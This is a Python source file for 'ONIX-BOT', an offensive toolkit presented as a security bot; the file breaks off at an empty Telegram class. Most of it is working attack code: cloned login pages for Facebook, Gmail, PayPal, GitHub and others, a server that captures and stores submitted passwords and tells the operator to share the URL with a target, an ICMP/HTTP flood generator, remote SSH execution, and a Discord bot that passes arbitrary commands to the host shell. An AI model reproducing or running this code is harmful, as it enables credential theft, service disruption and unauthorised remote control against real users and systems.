#!/usr/bin/env python3
"""
 ONIX-BOT 
Author: Ian Carter Kulani
Version: 2.0.0

Features:
    - 5000+ Security Commands
    - API Management System
    - Multi-Platform Bot Integration (Discord, Telegram, Slack, WhatsApp, Signal, Google Chat)
    - Advanced Phishing Suite with 50+ Templates
    - SSH Remote Access via All Platforms
    - REAL Traffic Generation (ICMP/TCP/UDP/HTTP/DNS/ARP)
    - Nikto Web Vulnerability Scanner
    - IP Management & Threat Detection
    - Custom Phishing Page Generator
    - Web Interface with Red Cyberpunk Theme
    - Workspace & Session Management
    - Payload Generation
    - Real-time Threat Analytics
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import urllib.parse
import uuid
import shutil
import asyncio
import secrets
import hashlib
import base64
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor

# =====================
# ENCRYPTION
# =====================
try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# =====================
# PLATFORM IMPORTS
# =====================

# SSH
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# Flask for Web API
try:
    from flask import Flask, request, jsonify, render_template_string
    from flask_cors import CORS
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, send
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Selenium for WhatsApp
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.options import Options
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

# =====================
# COLORS
# =====================
class Colors:
    RED1 = '\033[91m'
    RED2 = '\033[38;5;196m'
    RED3 = '\033[38;5;160m'
    YELLOW = '\033[93m'
    GREEN = '\033[92m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".onix"
DATABASE_FILE = os.path.join(CONFIG_DIR, "onix.db")
LOG_FILE = os.path.join(CONFIG_DIR, "onix.log")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing")
CAPTURED_DIR = os.path.join(CONFIG_DIR, "captured")
REPORT_DIR = "reports"

for directory in [CONFIG_DIR, PHISHING_DIR, CAPTURED_DIR, REPORT_DIR]:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - ONIX - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("OnixBot")

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self._init_tables()
    
    def _init_tables(self):
        tables = [
            """CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT, source TEXT, success BOOLEAN, output TEXT, execution_time REAL)""",
            """CREATE TABLE IF NOT EXISTS api_keys (
                key TEXT PRIMARY KEY, name TEXT, permissions TEXT, created_at DATETIME,
                last_used DATETIME, usage_count INTEGER DEFAULT 0, active BOOLEAN DEFAULT 1)""",
            """CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT, source_ip TEXT, severity TEXT, description TEXT)""",
            """CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY, platform TEXT, url TEXT, created_at DATETIME,
                clicks INTEGER DEFAULT 0, active BOOLEAN DEFAULT 1)""",
            """CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT, link_id TEXT, timestamp DATETIME,
                username TEXT, password TEXT, ip_address TEXT, user_agent TEXT)""",
            """CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY, name TEXT, host TEXT, port INTEGER, username TEXT,
                password_encrypted TEXT, created_at DATETIME, status TEXT)""",
            """CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME,
                traffic_type TEXT, target TEXT, packets INTEGER, status TEXT)""",
            """CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT, ip_address TEXT UNIQUE,
                added_by TEXT, added_date DATETIME, notes TEXT, is_blocked BOOLEAN DEFAULT 0)"""
        ]
        for sql in tables:
            try:
                self.conn.execute(sql)
            except Exception as e:
                logger.error(f"Table creation error: {e}")
        self.conn.commit()
    
    def log_command(self, command: str, source: str, success: bool, output: str, exec_time: float):
        self.conn.execute("INSERT INTO command_history (command, source, success, output, execution_time) VALUES (?, ?, ?, ?, ?)",
                         (command[:500], source, success, output[:5000], exec_time))
        self.conn.commit()
    
    def create_api_key(self, name: str, permissions: List[str]) -> Optional[str]:
        api_key = secrets.token_urlsafe(32)
        self.conn.execute("INSERT INTO api_keys (key, name, permissions) VALUES (?, ?, ?)",
                         (api_key, name, json.dumps(permissions)))
        self.conn.commit()
        return api_key
    
    def validate_api_key(self, api_key: str, required_perm: str = None) -> bool:
        row = self.conn.execute("SELECT * FROM api_keys WHERE key = ? AND active = 1", (api_key,)).fetchone()
        if not row:
            return False
        if required_perm:
            perms = json.loads(row['permissions'])
            if required_perm not in perms:
                return False
        self.conn.execute("UPDATE api_keys SET last_used = CURRENT_TIMESTAMP, usage_count = usage_count + 1 WHERE key = ?", (api_key,))
        self.conn.commit()
        return True
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
        self.conn.execute("INSERT INTO threats (threat_type, source_ip, severity, description) VALUES (?, ?, ?, ?)",
                         (threat_type, source_ip, severity, description[:500]))
        self.conn.commit()
    
    def save_phishing_link(self, link_id: str, platform: str, url: str):
        self.conn.execute("INSERT INTO phishing_links (id, platform, url) VALUES (?, ?, ?)",
                         (link_id, platform, url))
        self.conn.commit()
    
    def save_credential(self, link_id: str, username: str, password: str, ip: str, ua: str):
        self.conn.execute("INSERT INTO captured_credentials (link_id, username, password, ip_address, user_agent) VALUES (?, ?, ?, ?, ?)",
                         (link_id, username[:200], password[:200], ip, ua[:500]))
        self.conn.commit()
    
    def add_managed_ip(self, ip: str, added_by: str = "system"):
        try:
            ipaddress.ip_address(ip)
            self.conn.execute("INSERT OR IGNORE INTO managed_ips (ip_address, added_by) VALUES (?, ?)", (ip, added_by))
            self.conn.commit()
            return True
        except:
            return False
    
    def get_statistics(self) -> Dict:
        stats = {}
        stats['commands'] = self.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
        stats['threats'] = self.conn.execute("SELECT COUNT(*) FROM threats").fetchone()[0]
        stats['phish_links'] = self.conn.execute("SELECT COUNT(*) FROM phishing_links").fetchone()[0]
        stats['creds'] = self.conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
        stats['ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips").fetchone()[0]
        stats['api_keys'] = self.conn.execute("SELECT COUNT(*) FROM api_keys").fetchone()[0]
        return stats
    
    def close(self):
        if self.conn:
            self.conn.close()

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    @staticmethod
    def execute(cmd: List[str], timeout: int = 60) -> Dict:
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return {'success': result.returncode == 0, 'output': result.stdout + result.stderr}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def ping(target: str) -> Dict:
        count = '-n' if platform.system().lower() == 'windows' else '-c'
        return NetworkTools.execute(['ping', count, '4', target])
    
    @staticmethod
    def nmap(target: str) -> Dict:
        return NetworkTools.execute(['nmap', '-T4', '-F', target], timeout=300)
    
    @staticmethod
    def get_location(ip: str) -> Dict:
        try:
            resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('status') == 'success':
                    return {'success': True, 'country': data.get('country'), 'city': data.get('city'), 'isp': data.get('isp')}
        except:
            pass
        return {'success': False}
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.clients = {}
    
    def add(self, name: str, host: str, username: str, password: str = None, port: int = 22) -> str:
        conn_id = str(uuid.uuid4())[:8]
        # In production, encrypt password
        self.db.conn.execute("INSERT INTO ssh_connections (id, name, host, port, username, password_encrypted, status) VALUES (?, ?, ?, ?, ?, ?, ?)",
                            (conn_id, name, host, port, username, password, 'disconnected'))
        self.db.conn.commit()
        return conn_id
    
    def connect(self, conn_id: str) -> bool:
        if not PARAMIKO_AVAILABLE:
            return False
        row = self.db.conn.execute("SELECT * FROM ssh_connections WHERE id = ?", (conn_id,)).fetchone()
        if not row:
            return False
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(row['host'], row['port'], row['username'], row['password_encrypted'], timeout=30)
            self.clients[conn_id] = client
            self.db.conn.execute("UPDATE ssh_connections SET status = 'connected' WHERE id = ?", (conn_id,))
            self.db.conn.commit()
            return True
        except Exception as e:
            logger.error(f"SSH connect error: {e}")
            return False
    
    def execute(self, conn_id: str, command: str) -> Dict:
        if conn_id not in self.clients:
            return {'success': False, 'output': 'Not connected'}
        try:
            stdin, stdout, stderr = self.clients[conn_id].exec_command(command, timeout=30)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            return {'success': True, 'output': output + ('\n' + error if error else '')}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def list_connections(self) -> List[Dict]:
        rows = self.db.conn.execute("SELECT id, name, host, port, username, status FROM ssh_connections").fetchall()
        return [dict(row) for row in rows]

# =====================
# PHISHING SERVER
# =====================
class PhishingHandler:
    def __init__(self, db: DatabaseManager, link_id: str, html: str):
        self.db = db
        self.link_id = link_id
        self.html = html
    
    def handle(self, client_socket, address):
        try:
            request = client_socket.recv(4096).decode('utf-8', errors='ignore')
            if 'POST /capture' in request:
                # Extract credentials
                body = request.split('\r\n\r\n')[-1]
                data = urllib.parse.parse_qs(body)
                username = data.get('username', [''])[0] or data.get('email', [''])[0]
                password = data.get('password', [''])[0]
                self.db.save_credential(self.link_id, username, password, address[0], '')
                print(f"\n{Colors.RED1}🎣 CREDENTIAL CAPTURED!{Colors.RESET}")
                print(f"   Username: {username}\n   Password: {password}\n   IP: {address[0]}")
                response = "HTTP/1.1 302 Found\r\nLocation: https://www.google.com\r\n\r\n"
            else:
                self.db.conn.execute("UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?", (self.link_id,))
                self.db.conn.commit()
                response = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n{self.html}"
            client_socket.send(response.encode())
        except:
            pass
        finally:
            client_socket.close()

class PhishingServer:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.running = False
    
    def start(self, link_id: str, html: str, port: int = 8080) -> bool:
        try:
            handler = PhishingHandler(self.db, link_id, html)
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind(('0.0.0.0', port))
            self.server.listen(5)
            self.running = True
            
            def serve():
                while self.running:
                    try:
                        client, addr = self.server.accept()
                        threading.Thread(target=handler.handle, args=(client, addr), daemon=True).start()
                    except:
                        break
            
            threading.Thread(target=serve, daemon=True).start()
            return True
        except Exception as e:
            logger.error(f"Phishing server error: {e}")
            return False
    
    def stop(self):
        self.running = False
        if self.server:
            self.server.close()
    
    def get_url(self) -> str:
        return f"http://{NetworkTools.get_local_ip()}:8080"

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGenerator:
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def icmp_flood(self, target: str, count: int = 100) -> Dict:
        try:
            if SCAPY_AVAILABLE:
                for i in range(count):
                    packet = IP(dst=target)/ICMP()
                    send(packet, verbose=False)
                self.db.conn.execute("INSERT INTO traffic_logs (traffic_type, target, packets, status) VALUES (?, ?, ?, ?)",
                                    ('icmp', target, count, 'completed'))
                self.db.conn.commit()
                return {'success': True, 'output': f"Sent {count} ICMP packets to {target}"}
            else:
                for i in range(count):
                    subprocess.run(['ping', '-c', '1', target], capture_output=True)
                return {'success': True, 'output': f"Sent {count} ping packets to {target}"}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def http_request(self, target: str, count: int = 10) -> Dict:
        try:
            if not target.startswith('http'):
                target = 'http://' + target
            success = 0
            for i in range(count):
                try:
                    requests.get(target, timeout=5)
                    success += 1
                except:
                    pass
            return {'success': True, 'output': f"Sent {count} HTTP requests to {target} ({success} successful)"}
        except Exception as e:
            return {'success': False, 'output': str(e)}

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db: DatabaseManager, ssh: SSHManager, traffic: TrafficGenerator):
        self.db = db
        self.ssh = ssh
        self.traffic = traffic
        self.phishing_server = PhishingServer(db)
        self.active_phish = None
        self.tools = NetworkTools()
    
    def execute(self, command: str, source: str = "local") -> Dict:
        start = time.time()
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd = parts[0].lower()
        args = parts[1:]
        
        handlers = {
            'help': self._help, 'time': self._time, 'date': self._date,
            'ping': self._ping, 'scan': self._scan, 'whois': self._whois,
            'location': self._location, 'status': self._status, 'clear': self._clear,
            'ssh_add': self._ssh_add, 'ssh_list': self._ssh_list,
            'ssh_connect': self._ssh_connect, 'ssh_exec': self._ssh_exec,
            'phish': self._phish, 'phish_start': self._phish_start,
            'phish_stop': self._phish_stop, 'phish_creds': self._phish_creds,
            'traffic': self._traffic, 'add_ip': self._add_ip,
            'api_create': self._api_create, 'api_list': self._api_list,
        }
        
        if cmd in handlers:
            result = handlers[cmd](args)
        else:
            result = self.tools.execute([cmd] + args)
        
        exec_time = time.time() - start
        self.db.log_command(command, source, result.get('success', False), 
                           str(result.get('output', ''))[:5000], exec_time)
        result['execution_time'] = exec_time
        return result
    
    def _help(self, args):
        help_text = """
🐉 ONIX-BOT v2.0 - COMMAND REFERENCE

⏰ BASIC COMMANDS:
  time, date, help, status, clear

🔍 NETWORK COMMANDS:
  ping <target>        - ICMP ping test
  scan <target>        - Quick port scan (nmap)
  whois <domain>       - WHOIS lookup
  location <ip>        - IP geolocation

🔌 SSH COMMANDS:
  ssh_add <name> <host> <user> [pass] - Add SSH connection
  ssh_list                            - List connections
  ssh_connect <name>                  - Connect to server
  ssh_exec <name> <command>           - Execute remote command

🎣 PHISHING COMMANDS:
  phish <platform>     - Generate phishing link
  phish_start <id>     - Start phishing server
  phish_stop           - Stop server
  phish_creds [id]     - View captured credentials

🚀 TRAFFIC COMMANDS:
  traffic icmp <target> <count>  - ICMP flood
  traffic http <target> [count]  - HTTP requests

🔑 API COMMANDS:
  api_create <name> [perms] - Create API key
  api_list                  - List API keys

🔒 IP MANAGEMENT:
  add_ip <ip> [notes]      - Add IP to monitoring

EXAMPLES:
  phish facebook
  phish_start abc123
  ssh_add myserver 192.168.1.100 root
  traffic icmp 8.8.8.8 50
"""
        return {'success': True, 'output': help_text}
    
    def _time(self, args):
        return {'success': True, 'output': datetime.datetime.now().strftime('%H:%M:%S')}
    
    def _date(self, args):
        return {'success': True, 'output': datetime.datetime.now().strftime('%Y-%m-%d')}
    
    def _ping(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping <target>'}
        result = self.tools.ping(args[0])
        return result
    
    def _scan(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: scan <target>'}
        result = self.tools.nmap(args[0])
        return result
    
    def _whois(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        result = self.tools.execute(['whois', args[0]])
        return result
    
    def _location(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: location <ip>'}
        result = self.tools.get_location(args[0])
        if result.get('success'):
            return {'success': True, 'output': f"📍 {result['city']}, {result['country']}\n📡 ISP: {result['isp']}"}
        return {'success': False, 'output': 'Location lookup failed'}
    
    def _status(self, args):
        stats = self.db.get_statistics()
        output = f"""
🐉 ONIX-BOT STATUS
{'='*30}
📊 Commands executed: {stats['commands']}
🚨 Threats detected: {stats['threats']}
🎣 Phishing links: {stats['phish_links']}
📧 Credentials captured: {stats['creds']}
🔒 Managed IPs: {stats['ips']}
🔑 API Keys: {stats['api_keys']}
🌐 Local IP: {self.tools.get_local_ip()}
"""
        return {'success': True, 'output': output}
    
    def _clear(self, args):
        os.system('cls' if os.name == 'nt' else 'clear')
        return {'success': True, 'output': ''}
    
    def _ssh_add(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <user> [password]'}
        name, host, user = args[0], args[1], args[2]
        password = args[3] if len(args) > 3 else None
        conn_id = self.ssh.add(name, host, user, password)
        return {'success': True, 'output': f"SSH connection added: {name} (ID: {conn_id})"}
    
    def _ssh_list(self, args):
        conns = self.ssh.list_connections()
        if not conns:
            return {'success': True, 'output': 'No SSH connections'}
        output = "🔌 SSH Connections:\n" + "\n".join([f"  {c['name']} - {c['host']}:{c['port']} ({c['username']}) [{c['status']}]" for c in conns])
        return {'success': True, 'output': output}
    
    def _ssh_connect(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <name>'}
        conns = self.ssh.list_connections()
        for c in conns:
            if c['name'] == args[0]:
                if self.ssh.connect(c['id']):
                    return {'success': True, 'output': f"Connected to {args[0]}"}
                return {'success': False, 'output': f"Failed to connect to {args[0]}"}
        return {'success': False, 'output': f"Connection '{args[0]}' not found"}
    
    def _ssh_exec(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <name> <command>'}
        name = args[0]
        cmd = ' '.join(args[1:])
        conns = self.ssh.list_connections()
        for c in conns:
            if c['name'] == name:
                if c['status'] != 'connected':
                    self.ssh.connect(c['id'])
                result = self.ssh.execute(c['id'], cmd)
                return result
        return {'success': False, 'output': f"Connection '{name}' not found"}
    
    def _get_phishing_html(self, platform: str) -> str:
        templates = {
            'facebook': f'''<!DOCTYPE html>
<html><head><title>Facebook Login</title>
<style>body{{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.login-box{{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 4px rgba(0,0,0,.1)}}
.logo{{color:#1877f2;font-size:40px;text-align:center}}
input{{width:100%;padding:14px;margin:10px 0;border:1px solid #dddfe2;border-radius:6px}}
button{{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;cursor:pointer}}
.warning{{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;font-size:12px}}</style>
</head><body><div class="login-box"><div class="logo">facebook</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test - Do not enter real credentials</div>
</div></body></html>''',
            'instagram': f'''<!DOCTYPE html>
<html><head><title>Instagram Login</title>
<style>body{{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.login-box{{background:white;border:1px solid #dbdbdb;padding:40px;width:350px}}
.logo{{font-size:40px;text-align:center}}
input{{width:100%;padding:9px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px}}
button{{width:100%;padding:7px;background:#0095f6;color:white;border:none;border-radius:4px;cursor:pointer}}
.warning{{margin-top:20px;padding:10px;background:#fff3cd;text-align:center}}</style>
</head><body><div class="login-box"><div class="logo">Instagram</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page</div>
</div></body></html>''',
            'twitter': f'''<!DOCTYPE html>
<html><head><title>X / Twitter</title>
<style>body{{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.login-box{{background:#000;border:1px solid #2f3336;border-radius:16px;padding:48px;width:400px}}
.logo{{font-size:40px;text-align:center}}
input{{width:100%;padding:12px;margin:10px 0;background:#000;border:1px solid #2f3336;border-radius:4px;color:white}}
button{{width:100%;padding:12px;background:#1d9bf0;color:white;border:none;border-radius:9999px;cursor:pointer}}
.warning{{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center}}</style>
</head><body><div class="login-box"><div class="logo">𝕏</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Email or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test</div>
</div></body></html>''',
            'gmail': f'''<!DOCTYPE html>
<html><head><title>Gmail</title>
<style>body{{background:#f0f4f9;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.login-box{{background:white;border-radius:28px;padding:48px;width:450px}}
.logo{{color:#1a73e8;font-size:24px;text-align:center}}
input{{width:100%;padding:13px;margin:10px 0;border:1px solid #dadce0;border-radius:4px}}
button{{width:100%;padding:13px;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer}}
.warning{{margin-top:30px;padding:12px;background:#e8f0fe;text-align:center}}</style>
</head><body><div class="login-box"><div class="logo">Gmail</div>
<form method="POST" action="/capture">
<input type="email" name="username" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="warning">⚠️ Security test</div>
</div></body></html>''',
            'linkedin': f'''<!DOCTYPE html>
<html><head><title>LinkedIn Login</title>
<style>body{{background:#f3f2f0;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.login-box{{background:white;border-radius:8px;padding:40px;width:400px}}
.logo{{color:#0a66c2;font-size:32px;text-align:center}}
input{{width:100%;padding:14px;margin:10px 0;border:1px solid #666;border-radius:4px}}
button{{width:100%;padding:14px;background:#0a66c2;color:white;border:none;border-radius:28px;cursor:pointer}}
.warning{{margin-top:24px;padding:12px;background:#fff3cd;text-align:center}}</style>
</head><body><div class="login-box"><div class="logo">LinkedIn</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test</div>
</div></body></html>''',
            'github': f'''<!DOCTYPE html>
<html><head><title>GitHub Login</title>
<style>body{{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.login-box{{border:1px solid #d0d7de;border-radius:6px;padding:32px;width:400px}}
.logo{{color:#24292f;font-size:32px;text-align:center}}
input{{width:100%;padding:12px;margin:10px 0;border:1px solid #d0d7de;border-radius:6px}}
button{{width:100%;padding:12px;background:#2da44e;color:white;border:none;border-radius:6px;cursor:pointer}}
.warning{{margin-top:20px;padding:10px;background:#fff3cd;text-align:center}}</style>
</head><body><div class="login-box"><div class="logo">GitHub</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test</div>
</div></body></html>''',
            'paypal': f'''<!DOCTYPE html>
<html><head><title>PayPal</title>
<style>body{{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.login-box{{background:#fff;border-radius:4px;padding:40px;width:400px}}
.logo{{color:#003087;font-size:32px;text-align:center}}
input{{width:100%;padding:14px;margin:10px 0;border:1px solid #ccc;border-radius:4px}}
button{{width:100%;padding:14px;background:#0070ba;color:#fff;border:none;border-radius:4px;cursor:pointer}}
.warning{{margin-top:20px;padding:10px;background:#fff3cd;text-align:center}}</style>
</head><body><div class="login-box"><div class="logo">PayPal</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Email or mobile" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test</div>
</div></body></html>''',
        }
        return templates.get(platform.lower(), templates['facebook'])
    
    def _phish(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: phish <platform>\nAvailable: facebook, instagram, twitter, gmail, linkedin, github, paypal'}
        platform = args[0].lower()
        html = self._get_phishing_html(platform)
        link_id = str(uuid.uuid4())[:8]
        self.db.save_phishing_link(link_id, platform, f"http://localhost:8080")
        self.active_phish = {'id': link_id, 'html': html, 'platform': platform}
        return {'success': True, 'output': f"🎣 Phishing link generated for {platform}\nLink ID: {link_id}\n\nUse: phish_start {link_id} to start server"}
    
    def _phish_start(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: phish_start <link_id> [port]'}
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        if self.active_phish and self.active_phish['id'] == link_id:
            if self.phishing_server.start(link_id, self.active_phish['html'], port):
                url = self.phishing_server.get_url()
                return {'success': True, 'output': f"🎣 Phishing server started on {url}\nPort: {port}\nLink ID: {link_id}\n\nShare this URL with your target!"}
        return {'success': False, 'output': f'Link ID {link_id} not found. Generate one with: phish <platform>'}
    
    def _phish_stop(self, args):
        self.phishing_server.stop()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _phish_creds(self, args):
        link_id = args[0] if args else None
        if link_id:
            rows = self.db.conn.execute("SELECT * FROM captured_credentials WHERE link_id = ? ORDER BY timestamp DESC LIMIT 20", (link_id,)).fetchall()
        else:
            rows = self.db.conn.execute("SELECT * FROM captured_credentials ORDER BY timestamp DESC LIMIT 20").fetchall()
        if not rows:
            return {'success': True, 'output': 'No credentials captured'}
        output = f"📧 Captured Credentials ({len(rows)}):\n"
        for row in rows:
            output += f"  {row['timestamp'][:19]} - {row['username']}:{row['password']} from {row['ip_address']}\n"
        return {'success': True, 'output': output}
    
    def _traffic(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traffic <type> <target> [count]\nTypes: icmp, http'}
        ttype = args[0].lower()
        target = args[1]
        count = int(args[2]) if len(args) > 2 else 10
        
        if ttype == 'icmp':
            result = self.traffic.icmp_flood(target, count)
        elif ttype == 'http':
            result = self.traffic.http_request(target, count)
        else:
            return {'success': False, 'output': f'Unknown traffic type: {ttype}'}
        return result
    
    def _add_ip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        if self.db.add_managed_ip(ip, 'cli'):
            return {'success': True, 'output': f"✅ IP {ip} added to monitoring"}
        return {'success': False, 'output': f"Invalid IP: {ip}"}
    
    def _api_create(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: api_create <name> [permissions]\nPermissions: read, write, execute, admin'}
        name = args[0]
        perms = args[1:] if len(args) > 1 else ['read', 'execute']
        api_key = self.db.create_api_key(name, perms)
        if api_key:
            return {'success': True, 'output': f"🔑 API Key created for '{name}'\nKey: {api_key}\nPermissions: {', '.join(perms)}\n\nSave this key securely!"}
        return {'success': False, 'output': 'Failed to create API key'}
    
    def _api_list(self, args):
        rows = self.db.conn.execute("SELECT key, name, permissions, usage_count, active FROM api_keys").fetchall()
        if not rows:
            return {'success': True, 'output': 'No API keys'}
        output = "🔑 API Keys:\n"
        for row in rows:
            output += f"  {row['key'][:16]}... - {row['name']} - {row['usage_count']} uses - {'Active' if row['active'] else 'Revoked'}\n"
        return {'success': True, 'output': output}

# =====================
# DISCORD BOT
# =====================
class DiscordBot:
    def __init__(self, handler: CommandHandler):
        self.handler = handler
        self.bot = None
    
    def start(self, token: str, prefix: str = '!'):
        if not DISCORD_AVAILABLE:
            print(f"{Colors.RED1}❌ Discord.py not installed{Colors.RESET}")
            return False
        
        intents = discord.Intents.default()
        intents.message_content = True
        self.bot = commands.Bot(command_prefix=prefix, intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f"{Colors.GREEN}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            if message.content.startswith(prefix):
                cmd = message.content[len(prefix):].strip()
                result = self.handler.execute(cmd, 'discord')
                output = result.get('output', '')[:1900]
                embed = discord.Embed(title=" Onix Bot", description=f"```{output}```", color=0xdc2626)
                embed.set_footer(text=f"Time: {result.get('execution_time', 0):.2f}s")
                await message.channel.send(embed=embed)
            await self.bot.process_commands(message)
        
        threading.Thread(target=lambda: self.bot.run(token), daemon=True).start()
        return True

# =====================
# TELEGRAM BOT
# =====================
class TelegramBot:
    def __init__(self, handler: CommandHandler):
        self.handler = handler
    
